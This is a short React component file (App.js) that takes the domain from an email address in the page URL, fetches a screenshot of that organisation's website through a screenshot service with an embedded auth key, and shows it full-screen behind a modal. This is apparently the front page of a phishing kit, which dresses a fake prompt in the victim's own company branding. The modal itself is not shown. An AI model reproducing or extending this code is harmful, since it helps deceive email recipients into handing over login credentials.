import './App.css';
import { Modal } from './modal/modal';

function App() {

  const emailInTheURL = window.location.href;
  const sliceEqualSign = emailInTheURL.indexOf("@");
  const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

  
  return (
    <div className="App" style={{
      // /https://www.wikipedia.org/

      backgroundImage: `url(https://image.thum.io/get/auth/71417-poih/https://www.${extracetdEmail}/)`,
      width:'100vw',
      height:'100vh',
      backgroundRepeat:'no-repeat',
      backgroundSize:'cover',
      backgroundPosition:'top'
  }}>
        <Modal />
    </div>
  );
}

export default App;
